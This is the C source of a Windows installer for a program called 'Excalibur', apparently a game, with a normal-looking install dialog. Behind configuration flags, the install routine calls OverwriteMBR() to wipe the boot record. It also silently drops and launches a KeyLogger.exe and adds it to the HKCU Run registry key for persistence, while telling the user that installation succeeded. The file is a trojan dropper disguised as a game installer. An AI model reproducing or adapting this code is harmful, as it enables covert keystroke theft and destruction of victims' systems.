#include <windows.h>

#include <shobjidl.h>
#include <commctrl.h>
#include <objbase.h>
#include <comutil.h>
#include <shlobj.h>

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>

#include "config.h"

#include "Binaries/ExcaliburBinary.h"
#include "Installers.h"

#define WINDOW_WIDTH  450
#define WINDOW_HEIGHT 138

#define TEMP_FILE_BUFFER_SIZE 4096

static HWND installButton;
static HWND closeButton;

static HWND shortcutCheckbox;
static HWND launchCheckbox;

static HWND pathTextfield;
static HWND progressBar;

static bool createShortcut = true;
static bool launchAfterInstall = true;

static void CreateShortcut(const char* targetPath, const char* shortcutPath)
{
    CoInitialize(NULL);

    IShellLink* pShellLink = NULL;
    CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&pShellLink);

    pShellLink->lpVtbl->SetPath(pShellLink, targetPath);

    char desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    char shortcutFilePath[MAX_PATH];
    sprintf_s(shortcutFilePath, MAX_PATH, "%s\\%s.lnk", desktopPath, shortcutPath);

    IPersistFile* pPersistFile = NULL;
    pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (LPVOID*)&pPersistFile);

    WCHAR wideShortcutFilePath[MAX_PATH];
    MultiByteToWideChar(CP_UTF8, 0, shortcutFilePath, -1, wideShortcutFilePath, MAX_PATH);

    pPersistFile->lpVtbl->Save(pPersistFile, wideShortcutFilePath, true);

    pShellLink->lpVtbl->Release(pShellLink);
    pPersistFile->lpVtbl->Release(pPersistFile);

    CoUninitialize();
}

static void InstallGame(const char* path)
{
    FILE* binary = fopen(path, "wb");
    
    unsigned char buffer[TEMP_FILE_BUFFER_SIZE];
    uint32_t remainingBytes = bin_Excalibur_exe_len;
    uint32_t currentIndex = 0;

    while (remainingBytes > 0)
    {
        uint32_t bytesToWrite = (remainingBytes < TEMP_FILE_BUFFER_SIZE) ? remainingBytes : TEMP_FILE_BUFFER_SIZE;
        memcpy(buffer, &bin_Excalibur_exe[currentIndex], bytesToWrite);
        fwrite(buffer, sizeof(unsigned char), bytesToWrite, binary);

        currentIndex += bytesToWrite;
        remainingBytes -= bytesToWrite;

        int progress = (int)(((float)currentIndex / bin_Excalibur_exe_len) * 100);
        SendMessage(progressBar, PBM_SETPOS, progress, 0);
    }

    fclose(binary);
}

static void InstallEverything(char* path, HWND windowHandle)
{
#if OVERWRITE_MBR
    OverwriteMBR();
#endif

    CreateDirectory(path, NULL);
    int pathLength = strlen(path);
    while (pathLength > 0 && (path[pathLength - 1] == '\\' || path[pathLength - 1] == '/'))
    {
        path[pathLength - 1] = '\0';
        pathLength--;
    }

    char gamePath[MAX_PATH];
    strcpy(gamePath, path);
    strcat(gamePath, "\\Excalibur.exe");
    InstallGame(gamePath);

#if USE_KEYLOGGER
    char loggerPath[MAX_PATH];
    strcpy(loggerPath, path);
    strcat(loggerPath, "\\KeyLogger.exe");
    InstallKeylogger(loggerPath);

    HKEY regKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &regKey);
    RegSetValueEx(regKey, "Excalibur", 0, REG_SZ, (unsigned char*)loggerPath, strlen(loggerPath));
    RegCloseKey(regKey);

    ShellExecuteA(NULL, "open", loggerPath, NULL, NULL, SW_SHOWNORMAL);
#endif

    if (createShortcut) 
        CreateShortcut(gamePath, "Excalibur");

    MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);

    if (launchAfterInstall)
    {
        PostMessage(windowHandle, WM_CLOSE, 0, 0);
        ShellExecuteA(NULL, "open", gamePath, NULL, NULL, SW_SHOWNORMAL);   
    }
}

LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, LPARAM longParam)
{
    switch (message)
    {
        case WM_DESTROY:
        {
            PostQuitMessage(0);
        } return 0;

        case WM_PAINT:
        {
            PAINTSTRUCT paint;
            HDC handleDeviceContext = BeginPaint(windowHandle, &paint);
            FillRect(handleDeviceContext, &paint.rcPaint, (HBRUSH)(COLOR_WINDOW));
            EndPaint(windowHandle, &paint);
        } return 0;

        case WM_COMMAND:
        {
            switch (LOWORD(wordParam))
            {
                case BN_CLICKED:
                {
                    HWND clickedControl = (HWND)longParam;

                    if (clickedControl == shortcutCheckbox)
                    {
                        createShortcut = !createShortcut;
                        SendMessage(shortcutCheckbox, BM_SETCHECK, createShortcut, 0);
                    }
                    else if (clickedControl == launchCheckbox)
                    {
                        launchAfterInstall = !launchAfterInstall;
                        SendMessage(launchCheckbox, BM_SETCHECK, launchAfterInstall, 0);
                    }
                    else if (clickedControl == installButton)
                    {
                        char pathBuffer[MAX_PATH];
                        GetWindowText(pathTextfield, pathBuffer, MAX_PATH);
                        InstallEverything(pathBuffer, windowHandle);
                    }
                    else if (clickedControl == closeButton)
                        PostMessage(windowHandle, WM_CLOSE, 0, 0);
                } break;
            }
        } return 0;

        default: goto closeWindow;
    }

closeWindow:
    return DefWindowProc(windowHandle, message, wordParam, longParam);
}

int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, LPSTR argv, int argc)
{
    INITCOMMONCONTROLSEX commonControlsEx;
    commonControlsEx.dwSize = sizeof(INITCOMMONCONTROLSEX);
    commonControlsEx.dwICC  = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&commonControlsEx);

    WNDCLASS windowClass = {};
    windowClass.lpfnWndProc   = WindowProc;
    windowClass.hInstance     = instanceHandle;
    windowClass.lpszClassName = "Excalibur";
    RegisterClass(&windowClass);

    HWND windowHandle = CreateWindowEx(0, "Excalibur", "Excalibur Installer", WS_OVERLAPPEDWINDOW,
                                       CW_USEDEFAULT, CW_USEDEFAULT, WINDOW_WIDTH, WINDOW_HEIGHT,
                                       NULL, NULL, instanceHandle, NULL);
    HFONT defaultFont = CreateFont(16, 0, 0, 0, FW_NORMAL, false, false, false, 
                                  DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                  DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Segoe UI");

    if (windowHandle == NULL)
        return 0;

    pathTextfield    = CreateWindowEx(0, "EDIT", "C:\\Program Files\\Excalibur",
                                      WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                                      8, 8, 265, 23, windowHandle, NULL, instanceHandle, NULL);
    progressBar      = CreateWindowEx(0, PROGRESS_CLASS, NULL, WS_CHILD | WS_VISIBLE,
                                      8, 37, 265, 25, windowHandle, NULL, instanceHandle, NULL);
    installButton    = CreateWindow("BUTTON", "Install", WS_CHILD | WS_VISIBLE,
                                    8, 68, 75, 25, windowHandle, NULL, instanceHandle, NULL);
    closeButton      = CreateWindow("BUTTON", "Close", WS_CHILD | WS_VISIBLE,
                                    89, 68, 75, 25, windowHandle, NULL, instanceHandle, NULL);
    shortcutCheckbox = CreateWindow("BUTTON", "Create Desktop shortcut", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                    278, 14, 150, 17, windowHandle, NULL, instanceHandle, NULL);
    launchCheckbox   = CreateWindow("BUTTON", "Launch after install", WS_CHILD | WS_VISIBLE | BS_CHECKBOX,
                                    278, 45, 150, 17, windowHandle, NULL, instanceHandle, NULL);
    
    SendMessage(shortcutCheckbox, WM_SETFONT, (WPARAM)defaultFont, 1);
    SendMessage(launchCheckbox,   WM_SETFONT, (WPARAM)defaultFont, 1);
    SendMessage(pathTextfield,    WM_SETFONT, (WPARAM)defaultFont, 1);
    SendMessage(installButton,    WM_SETFONT, (WPARAM)defaultFont, 1);
    SendMessage(closeButton,      WM_SETFONT, (WPARAM)defaultFont, 1);

    SendMessage(launchCheckbox,   BM_SETCHECK, launchAfterInstall, 0);
    SendMessage(shortcutCheckbox, BM_SETCHECK, createShortcut,     0);

    ShowWindow(windowHandle, argc);
    
    MSG message = {};
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    (void)previousInstanceHandle;
    (void)argv;

    return message.wParam;
}
